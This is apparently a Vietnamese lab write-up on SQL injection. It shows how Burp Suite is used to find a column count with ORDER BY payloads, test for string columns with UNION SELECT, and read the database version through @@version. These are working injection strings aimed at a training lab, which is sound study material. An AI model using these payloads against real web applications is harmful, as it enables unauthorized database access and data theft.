# SQL injection attack, querying the database type and version on MySQL and Microsoft

Bài lab này yêu cầu ta truy cập vào dữ liệu liên quan tới version của phiên bản MySQL, Microsoft.

Đầu tiên ta mở `Burpsuite` và thực hiện gửi request tới `Repeater` rồi tiến hành kiểm tra xem có bao nhiêu cột bằng cách thay đổi payload của `Get request` thành:
- `/filter?category=Gifts'+ORDER+BY+1#`
- `/filter?category=Gifts'+ORDER+BY+2#`
- `/filter?category=Gifts'+ORDER+BY+3#`(tới đây thì server error, vậy là chỉ có 2 cột)

Tiếp theo ta tiến hành kiểm tra kiểu dữ liệu trong cột xem có phải ở dạng chuỗi không(vì thông tiên phiên bản được hiển thị ở dạng chuỗi) với payload của `Get request` như sau:
- `/filter?category=Gifts'+UNION+SELECT+'abc',+'def'#`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134520173227937863/image.png)

Tiếp theo ta truy cập vào dữ liệu trong cột @@version và lấy thông tin thui:
- `/filter?category='+UNION+SELECT+@@version,NULL#`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134520961182482493/image.png)
